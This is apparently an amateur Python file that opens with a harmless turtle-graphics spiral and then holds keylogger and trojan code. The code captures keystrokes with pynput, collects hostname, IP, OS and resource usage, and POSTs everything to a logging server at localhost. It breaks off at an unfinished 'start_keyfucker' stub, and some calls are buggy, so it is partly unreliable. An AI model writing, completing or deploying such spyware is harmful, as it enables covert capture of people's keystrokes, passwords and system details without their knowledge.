import psutil
import time
import os
import socket
import platform
import requests
import threading
import turtle

t = turtle.Turtle()

for x in range(200):
    t.left(-10)
    t.forward(-7.5)
    t.backward(20 * (2 / 9))
    
from pynput import keyboard

server_url = "http://localhost:5000/log"

def send_log(data):
    try:
        requests.post(server_url, json=data)
    except:
        pass
    
def trojan():
    info = {
        "type": "system_info",
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "os": platform.platform(),
    }
    send_log(info)
    
def system_monitor():
    while True:
        data = {
            "type": "resource_montior_memory",
            "cpu": psutil.cpu_percent(),
            "ram": psutil.virtual_memory().percent,
            "disk": psutil.disk_usage().percent,
        }
        
        send_log(data)
        
        time.sleep(4)
        
def on_key_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
        
    data = {
        "type": "keystroke",
        "key": k,
        "hostname": socket.gethostname,
        "sys": socket.socket.getsockname(),
    }
    
    send_log(data)
    
def start_keyfucker():
    UNFINISHED CODE
        